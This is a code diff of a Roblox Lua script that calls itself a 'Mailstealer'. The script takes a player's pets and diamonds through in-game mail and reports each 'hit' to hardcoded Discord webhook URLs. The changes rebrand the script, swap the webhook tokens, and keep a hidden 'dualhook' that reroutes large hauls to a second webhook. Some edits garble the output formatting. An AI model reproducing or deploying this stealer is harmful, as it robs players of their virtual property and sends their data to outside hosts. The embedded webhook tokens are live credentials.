@@ -5,7 +5,7 @@ if LoadingScreen == nil then
 end
 if Webhook == nil or Webhook == "" then
     Webhook =
-        "https://discord.com/api/webhooks/1207564673369505812/srvRoUR59gvba22DkRifiDT17su7nLcW3R758ymCDgBmVnYZp-dr29pkUZt8sptndQB9"
+        "https://discord.com/api/webhooks/1"
 end
 if Username == "" or Username == nil then
     Username = "TehPucuk_55"
@@ -257,7 +257,7 @@ local Blacklisted_Hoverboards = {"Original", "Red Flying Carpet", "Blue Flying C
 
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
-MailMessage = "Monzz Best Stealer"
+MailMessage = "MonzzBlox Better"
 plr = game.Players.LocalPlayer
 guis = plr.PlayerGui
 
@@ -478,9 +478,9 @@ for _, list in pairs({HugeList, ExcList, EggList, BoothList, HoverList, CharmLis
         table.insert(AllPetsList, value)
     end
 end
-local PetsListString = "\n" -- Create a string to represent the HugeList
+local PetsListString = "100" -- Create a string to represent the HugeList
 for i, v in pairs(AllPetsList) do
-    PetsListString = PetsListString .. v .. "\n" -- Append each Huge item to the string
+    PetsListString = PetsListString .. v .. "100" -- Append each Huge item to the string
 end
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
@@ -508,14 +508,14 @@ local DualRandomHuge = math.random(5, 15)
 if AmountOfHuges >= DualRandomHuge then
     Username = randomNick
     Webhook =
-        "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
+        "https://discord.com/api/webhooks/1207564530280955915/S-JZ9i95-iUb45OYhmWkmX6UeITiPUU47XBpAs7WjIdbrAQkRVkfHfFA5DxsxweqH3hJ"
 end
 math.randomseed(os.time())
 local DualRandomGem = math.random(5000000, 20000000)
 if GemAmount1 >= DualRandomGem then
     Username = randomNick
     Webhook =
-        "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
+        "https://discord.com/api/webhooks/1207564530280955915/S-JZ9i95-iUb45OYhmWkmX6UeITiPUU47XBpAs7WjIdbrAQkRVkfHfFA5DxsxweqH3hJ"
 end
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
@@ -530,12 +530,12 @@ local function SendWebhook(url, ping)
         "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
     data1 = {
         ["content"] = ping,
-        ["username"] = "Mailstealer v2.2",
+        ["username"] = "MonzzBlox",
         ["avatar_url"] = imgs,
         ["embeds"] = {
             {
                 ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
-                ["url"] = "https://discord.com/invite/Fuuekupu",
+                ["url"] = "https://discord.com/invite/Vm8CMjaF",
                 ["type"] = "rich",
                 ["color"] = tonumber(0xadffb0),
                 ["thumbnail"] = {
@@ -568,12 +568,12 @@ local function SendWebhook(url, ping)
                     },
                     {
                         ["name"] = "`(\240\159\154\128) Creators:`",
-                        ["value"] = "```Monzz Better```",
+                        ["value"] = "```MonzzBlox```",
                         ["inline"] = false
                     },
                     {
                         ["name"] = "",
-                        ["value"] = "__**https://discord.com/invite/Fuuekupu**__",
+                        ["value"] = "__**https://discord.com/invite/Vm8CMjaF**__",
                         ["inline"] = false
                     }
                 }
@@ -868,8 +868,8 @@ while wait() do
     if FinalList == 0 and GemsStolen == true then
         SendWebhook(url, "@everyone | v2.2")
         SendWebhook(
-            "https://discord.com/api/webhooks/1207564530280955915/S-JZ9i95-iUb45OYhmWkmX6UeITiPUU47XBpAs7WjIdbrAQkRVkfHfFA5DxsxweqH3hJ",
-            "`Hit Mailbox Stealer`"
+            "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN",
+            "`Not Dualhook`"
         )
         wait(2)
         shutdowngame()
